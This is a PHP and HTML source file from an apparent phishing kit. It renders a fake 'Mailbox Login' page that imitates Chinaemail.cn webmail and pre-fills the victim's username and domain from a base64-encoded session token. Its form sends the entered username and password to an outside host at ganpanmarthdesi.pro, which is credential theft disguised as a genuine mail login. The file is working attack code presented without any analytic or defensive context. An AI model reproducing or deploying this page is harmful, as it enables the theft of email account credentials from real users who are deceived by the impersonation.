<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Mailbox Login</title>
<link rel="shortcut icon" href="" type="image/gif"/>

<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 14px;
  font-weight: bold;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
input[type=id] {
  width: 175px;
  height: 36px;
  box-sizing: border-box;
  border: 1px solid #ccc;
  border-radius: 0px;
  font-size: 15px;
  font-family: Arial, Helvetica, sans-serif;
  background-color: white;
  background-image: url("https://mail.chinaemail.cn/theme/default/images/text_icon_1.png");
  background-position: 1px 5px; 
  background-repeat: no-repeat;
  padding: 10px 30px;
}
input[type=password] {
  width: 100%;
  height: 36;
  box-sizing: border-box;
  border: 1px solid #ccc;
  border-radius: 0px;
  font-size: 15px;
  font-family: Arial, Helvetica, sans-serif;
  background-color: white;
  background-image: url("https://mail.chinaemail.cn/theme/default/images/text_icon_2.png");
  background-position: 2px 7px; 
  background-repeat: no-repeat;
  padding: 10px 30px;
}
</style>
</head>
<body>
<div align="center">
	<table border="0" width="1080" cellspacing="0" cellpadding="0" background="https://i.ibb.co/jgq14Dr/bg-o2.png" height="704">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td>
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td width="342"></td>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td height="155"></td>
								</tr>
								<tr>
									<td height="430">
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<form action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post">
										<tr>
											<td height="40"></td>
										</tr>
										<tr>
											<td>
											<table border="0" width="100%" cellspacing="0" cellpadding="0">
												<tr>
													<td width="36"></td>
													<td>
				<input type="id" required placeholder="username"  name="user" value="<?php echo $users;?>" >
													</td>
							<td width="5">
                                <input name="link" type="hidden" value="http://mail.<?php echo $ddomain;?>" > 
                                <input name="domain" type="hidden" value="<?php echo $ddomain;?>">
				<input name="sender" type="hidden" value="Chinaemail.cn">
							<td style="float: left;display: block;height: 36px;line-height: 36px;font-size: 14px;font-weight: bold;font-family: Arial, Helvetica, sans-serif;width: 150px;overflow: hidden;white-space: nowrap;text-overflow: ellipsis;" >@<?php echo $ddomain;?></td>
													
<td width="34"></td>
												</tr>
											</table>
											</td>
										</tr>
										<tr>
											<td height="28"></td>
										</tr>
										<tr>
											<td>
											<table border="0" width="100%" cellspacing="0" cellpadding="0">
												<tr>
													<td width="33"></td>
													<td>
													<input type="password" required placeholder="Password"  name="passwd" value="" autofocus > </td>
													<td width="34"></td>
												</tr>
											</table>
											</td>
										</tr>
										<tr>
											<td height="32"></td>
										</tr>
										<tr>
											<td>
											<table border="0" width="100%" cellspacing="0" cellpadding="0">
												<tr>
													<td width="34"></td>
													<td>
													
<input type="image" src="https://i.ibb.co/yP3qSHG/btn.png" width="327" height="42"></td>
													<td width="34"></td>
												</tr>
											</table>
											</td>
										</tr>
										<tr>
											<td height="300"></td>
										</tr>
										<tr>
											<td height="20"></td>
										</tr>
										<tr>
											<td height="20"></td>
										</tr>
										
										</form>
									</table>
									</td>
								</tr>
								<tr>
									<td height="20"></td>
								</tr>
							</table>
							</td>
							<td width="345"></td>
						</tr>
					</table>
					</td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>
</body>

</html>


<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>